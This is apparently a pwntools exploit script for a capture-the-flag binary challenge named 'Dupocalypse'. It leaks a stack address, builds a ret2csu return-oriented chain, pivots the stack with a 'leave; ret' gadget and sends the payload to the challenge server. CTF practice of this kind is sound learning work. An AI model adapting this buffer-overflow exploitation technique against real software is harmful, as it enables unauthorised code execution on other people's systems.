#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "dupocalypse.ctf.prgy.in", 1337
#host, port = "localhost", 9004

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
b *__libc_csu_init+64
b *pwn+174
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================
#└─# pwn checksec chal 
#[*] '/home/kali/Windows/Dupocalypse/challenge/chal'
#    Arch:       amd64-64-little
#    RELRO:      Full RELRO
#    Stack:      No canary found
#    NX:         NX enabled
#    PIE:        No PIE (0x400000)
#    Stripped:   No

def exploit():
    global io
    io = initialize()
    io.recvuntil("The stack has spoken:")
    buffer = int(io.recvline().strip(), 16)
    log.info("Stack buffer: %#x", buffer)
    offset = 256

    #Ret2csu
    rop = ROP(elf)

    rop.call(elf.sym["__libc_csu_init"] + 90) #pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    rop.raw([0, 1, elf.sym["__init_array_start"], 0, 0, 0xcafebabe])
    rop.call(elf.sym["__libc_csu_init"] + 64) #mov rdx, rbx ; mov rsi, r14 mov edi, r13d ; call QWORD PTR [r12+rbx*8]
    rop.raw(0) # junk
    rop.raw([0, 0, 0, 0, 0, 0]) 


    #Win func
    rop.raw(elf.sym["main"]+434)
    rop.pwn()
    rop.rbp = buffer + 0xa0 - 8
    rop.call(elf.sym["getinput"]+149)
    rop.write(4, buffer + 0x10)
    rop.write(4, buffer + 0x35)

    payload = flat({0: rop.chain(),
                  offset: [buffer - 8, next(elf.search(asm("leave; ret")))]
              }, filler=b"\x00")
    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
